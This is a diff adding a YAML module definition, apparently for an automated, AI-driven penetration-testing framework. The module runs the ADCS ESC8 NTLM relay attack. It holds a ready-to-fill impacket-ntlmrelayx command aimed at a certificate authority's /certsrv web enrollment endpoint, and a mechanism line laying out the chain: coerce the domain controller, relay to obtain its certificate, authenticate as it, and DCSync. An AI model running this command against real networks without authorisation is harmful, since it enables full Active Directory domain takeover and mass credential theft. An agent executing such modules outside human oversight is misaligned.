@@ -1,0 +1,16 @@
+name: adcs_esc8
+category: ad
+description: ADCS ESC8 HTTP enrollment relay
+preconditions:
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-ntlmrelayx -t 'http://{ca_ip}/certsrv/certfnsh.asp' --adcs --template '{template}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "ESC8: Web enrollment endpoint accepts NTLM relay. Coerce DC → relay to /certsrv → get DC certificate → auth as DC → DCSync."
